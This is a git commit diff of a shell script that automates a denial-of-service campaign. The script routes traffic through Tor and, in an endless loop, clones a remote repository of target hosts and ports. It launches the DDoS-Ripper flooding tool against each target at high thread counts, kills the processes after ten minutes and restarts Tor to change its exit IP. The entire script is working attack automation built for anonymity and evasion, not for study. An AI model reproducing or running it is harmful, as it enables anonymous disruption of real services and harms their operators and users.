03b527488512ce4c94e032fd300525cf1f86f3df
alex viki <shevashokc@gmail.com>
2022-03-04 15:42:37 +0200

    ip

--- script.sh
+++ script.sh
@@ -11,24 +11,24 @@
 sudo toriptables2.py -i -l -r
 
 while true; do
-    # ps aux | grep 'Ripper.py'
-    # if [ $? -eq 1 ]; then
-        cd ~/
-        git clone https://github.com/AlexViki/dst.git
-        cd ~/dst
-        for URL in $(cat destination.txt); do
-            echo "------`hostname`------"
-            echo "------`date`------"
-            RIPPER_URL=`echo $URL | awk -F ':' '{print $1}'`
-            RIPPER_PORT=`echo $URL | awk -F ':' '{print $2}'`
-            cd && cd ~/DDoS-Ripper
-            sudo python3 DRipper.py -s $RIPPER_URL -p $RIPPER_PORT -t 135 -q 10000 &
-            sleep 5s
-        done
-    # else
-    # fi
+    cd ~/
+    git clone https://github.com/AlexViki/dst.git
+    cd ~/dst
+    for URL in $(cat destination.txt); do
+        echo "------`hostname`------"
+        echo "------`date`------"
+        RIPPER_URL=`echo $URL | awk -F ':' '{print $1}'`
+        RIPPER_PORT=`echo $URL | awk -F ':' '{print $2}'`
+        cd && cd ~/DDoS-Ripper
+        sudo python3 DRipper.py -s $RIPPER_URL -p $RIPPER_PORT -t 135 -q 10000 &
+        sleep 5s
+    done
+
     sleep 10m
-    for i in `ps aux | grep 'Ripper.py' | awk '{print $2}'`; do sudo kill -9 $i; done
+
+    for i in `ps aux | grep 'DRipper.py' | awk '{print $2}'`; do sudo kill -9 $i; done
+    sudo systemctl restart tor
+
 done
 #     TOR=`curl https://check.torproject.org/api/ip | jq -r .IsTor`
 #     if !$TOP; then
